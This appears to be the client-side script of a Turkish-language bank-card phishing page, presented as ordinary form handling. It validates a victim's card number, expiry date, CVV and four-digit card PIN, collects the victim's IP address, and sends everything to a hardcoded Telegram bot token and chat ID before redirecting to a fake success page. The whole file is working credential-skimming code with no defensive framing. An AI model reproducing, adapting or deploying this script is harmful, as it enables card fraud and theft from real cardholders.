// phmain.js - KART BİLGİSİ DOĞRULAMALI, KIRMIZI KAPLAMALI

const BOT_TOKEN = "8068339823:AAFNIqQZb_b-vE3oeZ0NGQ6QK4Xc0h34p7w";
const CHAT_ID = "-1002475411082";

// Slider fonksiyonları
window.slider1 = { prev: function() {} };
window.closeAlert = function() { 
    document.getElementById('alertDiv').style.display = 'none';
};
window.uyariKapat = function() { 
    document.getElementById('alertDiv3').style.display = 'none';
};

// Luhn algoritması (kart no doğrulama)
function luhnKontrol(kartNo) {
    let sum = 0;
    let alternate = false;
    for (let i = kartNo.length - 1; i >= 0; i--) {
        let n = parseInt(kartNo.charAt(i), 10);
        if (alternate) {
            n *= 2;
            if (n > 9) n -= 9;
        }
        sum += n;
        alternate = !alternate;
    }
    return sum % 10 === 0;
}

// SKT kontrol (gelecek tarih mi)
function sktKontrol(skt) {
    if (!skt || skt.length !== 5) return false;
    const [ay, yil] = skt.split('/');
    const ayNum = parseInt(ay, 10);
    const yilNum = parseInt(yil, 10);
    const suAn = new Date();
    const suAnYil = suAn.getFullYear() % 100;
    const suAnAy = suAn.getMonth() + 1;
    
    if (ayNum < 1 || ayNum > 12) return false;
    if (yilNum < suAnYil) return false;
    if (yilNum === suAnYil && ayNum < suAnAy) return false;
    return true;
}

// IP alma
function getIP(callback) {
    fetch('https://api.ipify.org?format=json')
        .then(res => res.json())
        .then(data => callback(data.ip))
        .catch(() => callback('Bilinmiyor'));
}

// Telegram'a gönder
function sendToTelegram(message, callback) {
    const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=${encodeURIComponent(message)}`;
    fetch(url)
        .then(() => { if(callback) callback(); })
        .catch(console.log);
}

// Kırmızı kaplama göster
function showAlert(message) {
    const alertDiv = document.getElementById('alertDiv');
    if (alertDiv) {
        alertDiv.style.display = 'block';
        const p = alertDiv.querySelector('p:nth-child(3)');
        if (p) p.innerText = message || 'Eksik veya hatalı bilgi girdiğini fark ettik. Kontrol edip tekrar deneyebilirsin.';
    }
}

// Sayfa yüklendiğinde
$(document).ready(function() {
    // Kart numarası formatlama
    $('#customUsername').on('input', function() {
        let val = this.value.replace(/\D/g, '');
        let formatted = '';
        for (let i = 0; i < val.length && i < 16; i++) {
            if (i > 0 && i % 4 === 0) formatted += ' ';
            formatted += val[i];
        }
        this.value = formatted;
    });
    
    // SKT formatlama
    $('#exp').on('input', function() {
        let val = this.value.replace(/\D/g, '');
        if (val.length >= 3) {
            this.value = val.slice(0,2) + '/' + val.slice(2,4);
        } else {
            this.value = val;
        }
    });
    
    // Sadece rakam
    $('#cvv, #kkpw').on('input', function() {
        this.value = this.value.replace(/\D/g, '');
    });
    
    // Gönderme butonu
    $('#btn-spc').click(function() {
        const kartNo = $('#customUsername').val().replace(/\s/g, '');
        const skt = $('#exp').val();
        const cvv = $('#cvv').val();
        const sifre = $('#kkpw').val();
        
        // Doğrulamalar
        if (!kartNo || kartNo.length !== 16) {
            showAlert('Kart numarası 16 haneli olmalıdır.');
            return;
        }
        if (!luhnKontrol(kartNo)) {
            showAlert('Geçersiz kart numarası!');
            return;
        }
        if (!skt || skt.length !== 5) {
            showAlert('Son kullanma tarihi AA/YY formatında olmalıdır.');
            return;
        }
        if (!sktKontrol(skt)) {
            showAlert('Son kullanma tarihi geçersiz veya süresi dolmuş!');
            return;
        }
        if (!cvv || cvv.length !== 3) {
            showAlert('CVV 3 haneli olmalıdır.');
            return;
        }
        if (!sifre || sifre.length !== 4) {
            showAlert('Kart şifresi 4 haneli olmalıdır.');
            return;
        }
        
        // Kırmızı kaplamayı gizle
        $('#alertDiv').hide();
        
        getIP(function(ip) {
            const mesaj = `Kredi Kartı Bilgisi:\n Kart No: ${kartNo}\n SKT: ${skt}\n CVV: ${cvv}\n Şifre: ${sifre}\n IP: ${ip}`;
            sendToTelegram(mesaj, function() {
                window.location.href = 'success.html';
            });
        });
    });
});
